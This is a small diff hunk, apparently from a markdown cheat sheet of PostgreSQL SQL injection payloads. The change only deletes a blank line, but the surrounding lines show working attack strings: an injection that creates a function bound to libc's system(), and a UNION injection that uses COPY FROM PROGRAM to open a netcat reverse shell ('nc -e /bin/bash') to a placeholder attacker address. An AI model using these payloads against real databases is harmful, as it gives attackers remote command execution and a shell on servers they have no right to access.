@@ -27,7 +27,6 @@ sql'; CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6'
 
 # use the program arg
 ' UNION SELECT 1; COPY (SELECT '') FROM PROGRAM 'nc -e /bin/bash YOUR_IP 4444'; --
-
 ```
 
 ### Additional cracks by col
